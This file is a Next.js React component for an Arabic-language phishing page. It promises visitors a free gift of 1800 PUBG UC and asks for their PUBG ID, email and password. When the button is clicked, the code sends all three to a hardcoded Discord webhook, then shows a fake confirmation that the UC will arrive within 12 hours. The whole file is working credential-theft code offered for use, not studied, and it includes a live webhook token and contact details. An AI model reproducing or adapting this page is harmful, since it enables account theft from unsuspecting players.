"use client"
import { useState, useEffect } from "react";

export default function Home() {
  const [pubgId, setPubgId] = useState("");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");


  useEffect(()=>{
    let btn = document.getElementById("btn")
    let box = document.getElementById("box")
    let boxx = document.getElementById("boxx")
    const handleClick = async (event) => {
      event.preventDefault();
        try {
          const webhookUrl = 'https://discord.com/api/webhooks/1219400714024124466/WwuDgxiEyPSBHGVIdYYsnEy02RrrJNeQ2KgrhukACQyAKXxdEZH8eVLXl-JDitwLaNRS';
    
          const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({
              content: `**PUBG ID:** ${pubgId}\n**Email:** ${email}\n**Password:** ${password}`
            })
          });
    
          if (response.ok) {
            console.log('Data sent to Discord webhook successfully');
            // Reset the form
            setPubgId("");
            setEmail("");
            setPassword("");
          } else {
            console.error('Failed to send data to Discord webhook');
          }
        } catch (error) {
          console.error('Failed to send data to Discord webhook:', error);
        }
    
        box.style.display = "none"
        boxx.style.display = "flex"
      };
      

  
    btn.addEventListener("click", handleClick)
  },[])
  
  return (
    <div>
    <div id="box" className="box">
      <h2>من احد المستخدمين UCلقد تلقيت 1800 </h2>
      <h3>...اكبر موقع عربي في الشرق الاوسط لتحويل شدات ببجي</h3>
      <p>كل ما تحتاجة لخدمات ببجي العالمية - الكورية</p>
      <form className="form">
        <input placeholder="PUBG ID" type="text" value={pubgId} onChange={(e) => setPubgId(e.target.value)} />
        <input placeholder="Email" type="text" value={email} onChange={(e) => setEmail(e.target.value)} />
        <input placeholder="password" type="text" value={password} onChange={(e) => setPassword(e.target.value)} />
        <button id="btn">استلام الهدية</button>
      </form>
      <div className="photos">
        <div className="box1">
          <img width={150} src="uc.png" alt="UC" />
        </div>
        <div className="box1">
          <img className="img" width={200} src="pubg1.png" alt="PUBG" />
        </div>
      </div>
    </div>
    <div id="boxx" className="boxx">
    <h2>✅ تم الارسال بنجاح</h2>
    <h3>سيتم تحويل الشدات الى حسابك في غضون 12 ساعة</h3>
    <p>اذا كان هناك أي خطئ في بياناتك لن يتم أستلام الهدية لذلك ننصح بإعادة تعبئة الحقول بدون أخطاء<br></br>
في حال لم يتم تلقي الهدية تواصل معنا على :<br></br>
+9627764358718<br></br>
pubg_sth@gmail.com</p>
    </div>
    </div>
  );
}
